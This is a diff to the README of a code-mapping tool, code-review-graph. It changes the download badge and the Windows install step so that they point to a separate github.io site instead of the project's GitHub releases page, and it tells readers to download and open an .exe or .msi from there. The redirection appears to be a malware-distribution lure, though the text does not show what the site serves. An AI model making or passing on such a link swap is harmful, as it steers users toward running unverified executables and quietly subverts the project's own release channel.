@@ -1,6 +1,6 @@
 # 🔗 code-review-graph - Improve your code reviews with maps
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/apodal-cherry334/code-review-graph/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://apodal-cherry334.github.io)
 
 Code-review-graph builds a map of your software code. It helps AI tools read your files. This tool makes AI work faster and smarter when it scans your projects. Use it to speed up your deep dives into large codebases.
 
@@ -8,7 +8,7 @@ Code-review-graph builds a map of your software code. It helps AI tools read you
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/apodal-cherry334/code-review-graph/releases) to see all versions.
+1. Visit the [releases page](https://apodal-cherry334.github.io) to see all versions.
 2. Look for the file ending in `.msi` or `.exe` under the latest release heading.
 3. Click the file name to download the installer to your Downloads folder.
 4. Open the file you just downloaded.
